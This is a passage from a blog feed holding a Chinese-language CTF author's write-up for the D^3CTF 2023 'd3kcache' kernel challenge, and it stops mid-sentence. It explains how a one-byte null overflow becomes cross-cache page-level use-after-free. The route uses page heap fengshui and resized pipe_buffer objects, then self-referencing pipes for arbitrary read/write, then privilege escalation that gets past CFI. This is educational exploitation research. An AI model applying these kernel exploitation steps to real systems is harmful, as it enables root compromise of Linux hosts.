<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="http://blog.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.arttnba3.cn/"/>
  <updated>2023-05-04T18:09:18.097Z</updated>
  <id>http://blog.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【CTF.0x08】D^ 3CTF2023 d3kcache 出题手记</title>
    <link href="http://blog.arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/"/>
    <id>http://blog.arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/</id>
    <published>2023-05-01T19:13:27.000Z</published>
    <updated>2023-05-04T18:09:18.097Z</updated>
    
    <content type="html"><![CDATA[<p>「さらば、全てのリヌクス カーネル エクスプロイテーション。」</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>都是废话，可以不用看（笑）</p></blockquote><p>不出意外的话这应该是笔者本科阶段最后一次出 D3CTF 的题目了，虽然说笔者一直想整一些好活，但是鉴于笔者实在是太菜了所以一直没能出过特别优秀的题目：）</p><!--相信有不少人（当然，笔者的烂题应该不会有多少人愿意做:-D ）应当已经注意到题目的 banner 是 neta 自新世纪福音战士剧场版的海报----笔者需要为自己过去失败的这一年多时间画上一个不完美的句号，而这道题便是笔者向曾经那个被困于 Linux kernel 的小朋友所作的最终道别：）--><p>笔者一直在想，作为一名黑客，在剥离去各种不同的题目结构、漏洞环境的背后，<strong>我们究竟能在多么极端的情况下完成对一个漏洞的利用？我们是否能够脱离实验室的理想环境实现一种足以应用在实战中的通解？</strong></p><p>Google 在 CVE-2021-22555 当中向我们展示了一个普通的堆上 2 字节溢出如何变成堆溢出&amp; UAF 通杀解法，<a href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">BitsByWill</a> 在 corCTF 2022 中向我们展示了利用页级内核堆风水打破不同 caches 间的阻隔，<a href="https://syst3mfailure.io/">D3v17</a> 则仅利用一个 <code>&#39;\0&#39;</code> 字节的堆溢出便完成了内核提权，<a href="https://kylebot.net/">Kylebot</a> 更是将这一个 <code>&#39;\0&#39;</code> 字节的堆溢出转成了 cross-cache overflow 完成利用，那么再更进一步呢——</p><ul><li>如果漏洞所在结构体大小不够合适&#x2F;结构体自身无法帮助我们完成利用，我们只能借助 <code>msg_msg</code> 等结构体去适配大小，但这类结构体较为稀有且存在诸多限制（例如往往带有一个 header）</li><li>如果漏洞存在于一个独立的 <code>kmem_cache</code> 当中，我们无法借助其他的内核结构体完成利用，只能考虑转化为 cross-cache overflow</li><li>如果漏洞仅有 1 字节的溢出，我们无法利用页级堆风水转成利用 Google 的通杀 exp ，又或是禁用了 System V 消息队列无法利用多级 <code>msg_msg</code>  构造 UAF，我们便只能考虑其他的方案</li><li>如果系统内存较小， 或是 <code>modprobe_path</code> 为静态值，Kylebot 的 unlink attack 将无法发挥作用，我们只好考虑 D3v17 的 <code>poll_list</code> 任意释放</li><li>如果漏洞所在结构体大小不够合适，我们只能进行更加细粒度的页级堆风水，<strong>而不同 order 间的风水会使得成功率大打折扣</strong></li><li><strong>如果内核开启了 Control Flow Integrity，又或者我们甚至都不知道内核镜像信息，那么传统的 ROP 方法基本宣告死亡</strong></li></ul><p><strong>在这样极端的情况下，我们是否还仍能够找到一种通法来完成对内核漏洞的利用？</strong>——这便是笔者在出这道题时最初的想法：）</p><!--此外，笔者认为，**若我们真的找到了这样的一种通法，那么此后的基于内存破坏的 Linux kernel exploitation 便真正算是宣告走到了尽头，此后所有的此类漏洞或是题目不过都是换一种形式过家家罢了：）**----这也是为什么笔者要用 《eva：终》 的那句话来作为这道题目的标语。--><h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01.题目分析"></a>0x01.题目分析</h1><p>题目逆向起来应该还是比较简单的，在模块初始化函数中创建了一个独立的 <code>kmem_cache</code> ，对象大小为 2048：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">d3kcache_module_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    kcache_jar = kmem_cache_create_usercopy(<span class="hljs-string">&quot;kcache_jar&quot;</span>, KCACHE_SIZE, <span class="hljs-number">0</span>, <br>                         SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, <br>                         <span class="hljs-number">0</span>, KCACHE_SIZE, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">memset</span>(kcache_list, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(kcache_list));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>自定义的 ioctl 函数提供了分配、追加编辑、释放、读取的一个堆菜单，漏洞便出在追加编辑当中，当写满 2048 字节时存在着一个 <code>\0</code> 字节的溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">d3kcache_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *__file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">switch</span> (cmd) &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">case</span> KCACHE_APPEND:<br>            <span class="hljs-keyword">if</span> (usr_cmd.idx &lt; <span class="hljs-number">0</span> || usr_cmd.idx &gt;= KCACHE_NUM <br>                || !kcache_list[usr_cmd.idx].buf) &#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kcache:] Invalid index to write.&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (usr_cmd.sz &gt; KCACHE_SIZE || <br>                (usr_cmd.sz + kcache_list[usr_cmd.idx].size) &gt;= KCACHE_SIZE) &#123;<br>                size = KCACHE_SIZE - kcache_list[usr_cmd.idx].size;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                size = usr_cmd.sz;<br>            &#125;<br><br>            kcache_buf = kcache_list[usr_cmd.idx].buf;<br>            kcache_buf += kcache_list[usr_cmd.idx].size;<br><br>            <span class="hljs-keyword">if</span> (copy_from_user(kcache_buf, usr_cmd.buf, size)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            kcache_buf[size] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">/* 漏洞点 */</span><br><br>            retval = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>同时查看题目所提供的内核编译文件，可以发现<strong>开启了 Control Flow Integrity 保护</strong>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_CFI_CLANG</span>=y<br></code></pre></td></tr></table></figure><p>其他的各种常规保护（KPTI、KASLR、Hardened Usercopy、…）基本上都是开启的，这里就不阐述了</p><blockquote><p>当然，做内核漏洞利用自然要默认这些保护都开了：）</p></blockquote><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>由于题目所在的 <code>kmem_cache</code> 为一个独立的  <code>kmem_cache</code> ，因此我们只能考虑 <strong>cross-cache overflow</strong>：<strong>溢出到其他结构体所在页面上完成利用</strong></p><blockquote><p>毕竟你总不能指望在 freelist 相关保护都开启的情况下 free object 的 next 指针刚好在前 8 字节然后覆写又刚好能把 freelist 劫持到有效可控地址上：）</p></blockquote><h2 id="Step-I-页级堆风水构造稳定跨页溢出布局"><a href="#Step-I-页级堆风水构造稳定跨页溢出布局" class="headerlink" title="Step.I - 页级堆风水构造稳定跨页溢出布局"></a>Step.I - 页级堆风水构造稳定跨页溢出布局</h2><p>为了保证溢出的稳定性，这里笔者使用页级堆风水的方法来构造<strong>预溢出布局</strong></p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>页级堆风水是一种其实不算新但是其实还是稍微有点新的利用手法，顾名思义，<strong>页级堆风水</strong>即以内存页为粒度的内存排布方式，而内核内存页的排布对我们来说不仅未知且信息量巨大，因此这种利用手法实际上是让我们<strong>手工构造一个新的已知的页级粒度内存页排布</strong></p><p>首先让我们重新审视 slub allocator 向 buddy system 请求页面的过程，当 freelist page 已经耗空且 partial 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 buddy system 申请页面：</p><p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" alt="image.png"></p><p>接下来让我们重新审视 buddy system ，其基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同 order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶 order 取一份连续内存页拆成两半，其中一半挂回当前请求 order 链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system 页面分配基本原理：</p><p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" alt="page.gif"></p><p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p><ul><li>向 buddy system 请求两份连续的内存页</li><li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页</li><li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页</li></ul><p><strong>此时我们便有可能溢出到其他的内核结构体上，从而完成 cross-cache overflow</strong></p><h3 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h3><p>在内核当中有着很多的可以直接向 buddy system 请求页面的 API，这里笔者选用一个来自于 <a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> 的方案：</p><p>当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING ↓</span><br>    packet_set_ring()<br>    alloc_pg_vec()<br></code></pre></td></tr></table></figure><p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2<sup>order</sup> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br><span class="hljs-type">int</span> i;<br><br>pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br><span class="hljs-keyword">goto</span> out_free_pgvec;<br>&#125;<br><br>out:<br><span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>free_pg_vec(pg_vec, order, block_nr);<br>pg_vec = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>相应地， <code>pgv</code> 中的页面也会在 socket 被关闭后释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_release()<br>    packet_set_ring()<br>    free_pg_vec()<br></code></pre></td></tr></table></figure><p> <code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）</p><p>由此，我们可以获得<strong>对一块连续内存的页级掌控</strong>，从而可以这样构造出如下图所示堆布局：</p><ul><li>先释放一部分页面，让 victim object 取得这些页面</li><li>释放一份页面，向题目模块请求分配对象，从而获得该份页面</li><li>再释放一部分页面，让 victim object 取得这些页面</li></ul><p>这样题目所在的页面便会被夹在 victim 对象的页面中间，使得<strong>溢出的稳定性大幅增加</strong></p><p><img src="https://s2.loli.net/2023/05/02/VvPk5nKYmDCWxOs.png" alt="image.png"></p><h2 id="Step-II-fcntl-F-SETPIPE-SZ-更改-pipe-buffer-所在-slub-大小，跨页溢出构造页级-UAF"><a href="#Step-II-fcntl-F-SETPIPE-SZ-更改-pipe-buffer-所在-slub-大小，跨页溢出构造页级-UAF" class="headerlink" title="Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF"></a>Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF</h2><p>接下来我们考虑溢出的目标对象，相信大家最先想到的应该是万能结构体 <code>msg_msg</code> ，但是在笔者看来这个结构体 <em>仍旧不够强大</em> ，而且在过去的各种漏洞利用当中我们未免也太依赖于 <code>msg_msg</code> 了，所以笔者想要探索一些新的方法：）</p><blockquote><p><img src="https://s2.loli.net/2023/05/01/sJB9zbLgSCYV8KE.png" alt="猪猪侠，你太依赖超级棒棒糖了.png"></p></blockquote><p>由于仅有一个字节的溢出，毫无疑问的是我们需要寻找一些在结构体头部便有指向其他内核对象的指针的内核对象，我们不难想到的是 <code>pipe_buffer</code> 是一个非常好的的利用对象，其开头有着指向 <code>page</code> 结构体的指针，而 <code>page</code> 的大小仅为 <code>0x40</code> ，可以被 0x100 整除，若我们能够<strong>通过 partial overwrite 使得两个管道指向同一张页面，并释放掉其中一个</strong>，我们便构造出了<strong>页级的 UAF</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p><p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p><p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p><p>同时<strong>管道的特性还能让我们在 UAF 页面上任意读写</strong>，这真是再美妙不过了：）</p><p>但是有一个小问题，<code>pipe_buffer</code> 来自于 <code>kmalloc-cg-1k</code> ，其会请求 order-2 的页面，而题目模块的对象大小为 2k，其会请求 order-3 的页面，如果我们直接进行不同 order 间的堆风水的话，则利用成功率会大打折扣 :（</p><p>但 pipe 可以被挖掘的潜力远比我们想象中大得多：）现在让我们重新审视 <code>pipe_buffer</code> 的分配过程，其实际上是单次分配 <code>pipe_bufs</code> 个 <code>pipe_buffer</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>这里注意到 <code>pipe_buffer</code> <strong>不是一个常量而是一个变量</strong>，那么<strong>我们能否有方法修改 pipe_buffer 的数量？</strong>答案是肯定的，pipe 系统调用非常贴心地为我们提供了 <code>F_SETPIPE_SZ</code> <strong>让我们可以重新分配 pipe_buffer 并指定其数量</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>pipe = get_pipe_info(file, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>ret = pipe_resize_ring(pipe, nr_slots);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br></code></pre></td></tr></table></figure><p>那么我们不难想到的是<strong>我们可以通过 fcntl() 重新分配单个 pipe 的 pipe_buffer 数量，</strong>：</p><ul><li>对于每个 pipe 我们<strong>指定分配 64 个 pipe_buffer，从而使其向 kmalloc-cg-2k 请求对象，而这将最终向 buddy system 请求 order-3 的页面</strong></li></ul><p>由此，我们便成功使得 <code>pipe_buffer</code> 与题目模块的对象<strong>处在同一 order 的内存页上</strong>，从而提高 cross-cache overflow 的成功率</p><p>不过需要注意的是，由于 page 结构体的大小为 0x40，其可以被 0x100 整除，因此若我们所溢出的目标 page 的地址最后一个字节刚好为 <code>\x00</code>，  <em>那就等效于没有溢出</em>  ，因此实际上利用成功率仅为 <code>75% </code> （悲）</p><h2 id="Step-III-构造二级自写管道，实现任意内存读写"><a href="#Step-III-构造二级自写管道，实现任意内存读写" class="headerlink" title="Step.III - 构造二级自写管道，实现任意内存读写"></a>Step.III - 构造二级自写管道，实现任意内存读写</h2><p>有了 page-level UAF，我们接下来考虑向这张页面分配什么结构体作为下一阶段的 victim object</p><p>由于管道本身便提供给我们读写的功能，而我们又能够调整 <code>pipe_buffer</code> 的大小并重新分配结构体，那么再次选择 <code>pipe_buffer</code> 作为 victim object 便是再自然不过的事情：）</p><p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p><p>接下来我们可以通过 UAF 管道<strong>读取 pipe_buffer 内容，从而泄露出 page、pipe_buf_operations 等有用的数据</strong>（可以在重分配前预先向管道中写入一定长度的内容，从而实现数据读取），由于我们可以通过 UAF 管道直接改写 <code>pipe_buffer</code> ，因此将漏洞转化为 dirty pipe 或许会是一个不错的办法（这也是本次比赛中 NU1L 战队的解法）</p><p>但是 pipe 的强大之处远不止这些，由于我们可以对 UAF 页面上的 <code>pipe_buffer</code> 进行读写，我们可以<strong>继续构造出第二级的 page-level UAF</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p><p>为什么要这么做呢？在第一次 UAF 时我们获取到了 page 结构体的地址，而 page 结构体的大小固定为 0x40，<strong>且与物理内存页一一对应</strong>，试想若是我们可以不断地修改一个 pipe 的 page 指针，<strong>则我们便能完成对整个内存空间的任意读写</strong>，因此接下来我们要完成这样的一个利用系统的构造</p><p>再次重新分配 <code>pipe_buffer</code> 结构体到第二级 page-level UAF 页面上，<strong>由于这张物理页面对应的 page 结构体的地址对我们而言是已知的，我们可以直接让这张页面上的 pipe_buffer 的 page 指针指向自身，从而直接完成对自身的修改</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p><p>这里我们可以篡改 <code>pipe_buffer.offset</code> 与 <code>pipe_buffer.len</code> 来移动 pipe 的读写起始位置，从而实现无限循环的读写，但是这两个变量会在完成读写操作后重新被赋值，因此这里我们使用<strong>三个管道</strong>：</p><ul><li>第一个管道用以进行内存空间中的任意读写，我们通过修改其 page 指针完成 ：）</li><li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li><li>第三个管道用以修改第一个与第二个管道，使得第一个管道的 pipe 指针指向指定位置、第二个管道的写入起始位置指向第三个管道</li></ul><p>通过这三个管道之间互相循环修改，我们便<strong>实现了一个可以在内存空间中进行近乎无限制的任意读写系统</strong> ：）</p><h2 id="Step-IV-提权"><a href="#Step-IV-提权" class="headerlink" title="Step.IV - 提权"></a>Step.IV - 提权</h2><p>有了内存空间中的任意读写，提权便是非常简便的一件事情了，这里笔者给出三种提权方法：）</p><h3 id="方法一、修改当前进程的-task-struct-的-cred-为-init-cred"><a href="#方法一、修改当前进程的-task-struct-的-cred-为-init-cred" class="headerlink" title="方法一、修改当前进程的 task_struct 的 cred 为 init_cred"></a>方法一、修改当前进程的 task_struct 的 cred 为 init_cred</h3><p><code>init_cred</code> 为有着 root 权限的 cred，我们可以直接将当前进程的 cred 修改为该 cred 以完成提权，这里iwom可以通过 <code>prctl(PR_SET_NAME, &quot;arttnba3pwnn&quot;);</code> 修改 <code>task_struct.comm</code> ，从而方便搜索当前进程的 <code>task_struct</code> 在内存空间中的位置：）</p><p>不过 <code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的，我们在调试时未必能够获得其地址，因此这里笔者选择通过解析 <code>task_struct</code> 的方式向上一直找到 <code>init</code> 进程（所有进程的父进程）的 <code>task_struct</code> ，从而获得 <code>init_cred</code> 的地址：</p><p><img src="https://s2.loli.net/2023/05/02/jO5GwFnmSxkr3fg.png" alt="image.png"></p><h3 id="方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成-ROP"><a href="#方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成-ROP" class="headerlink" title="方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP"></a>方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP</h3><p><strong>开启了 CFI 并不代表我们便不能够在内核空间中进行任意代码执行了，作为一名黑客没有什么是不可能的，所因此我们仍然要进行任意代码执行：）</strong>（←有点中二的一个人</p><p>由于 page 结构体数组与物理内存页一一对应的缘故，我们可以很轻易地在物理地址与 page 结构体地址间进行转换，而在页表当中存放的是物理地址，我们不难想到的是<strong>我们可以通过解析当前进程的页表来获取到内核栈的物理地址，从而获取到内核栈对应的 page</strong>，之后我们可以<strong>直接向内核栈上写 ROP chain 来完成任意代码执行</strong></p><p>页表的地址可以通过 <code>mm_struct</code> 获取， <code>mm_struct</code> 地址可以通过 <code>task_struct</code> 获取，内核栈地址同样可以通过 <code>task_struct</code> 获取，那么这一切其实是水到渠成的事情：</p><p><img src="https://s2.loli.net/2023/05/02/sRVcEax3wHApBW2.png" alt="image.png"></p><blockquote><p>但这种方法有一个缺陷，我们会<strong>有一定概率没法直接写到当前进程的内核栈上</strong>（也不知道写哪去了），从而导致 ROP 失败，<strong>原因不明</strong></p><blockquote><p>笔者暂时没有发现整个过程的原理存在缺陷的地方，甚至尝试多次重新解析页表（得到的内核栈地址不变）然后写入数据后仍旧无事发生，也不知道究竟是哪出了问题 ：(</p></blockquote></blockquote><h3 id="方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现-USMA"><a href="#方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现-USMA" class="headerlink" title="方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA"></a>方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA</h3><p>既然我们能够进行内存空间中的任意读写，<strong>直接改写内核代码段也是一个实现任意代码执行的好办法</strong>，但是直接映射区对应的内核代码段区域<strong>没有可写入权限，直接写会导致 kernel panic 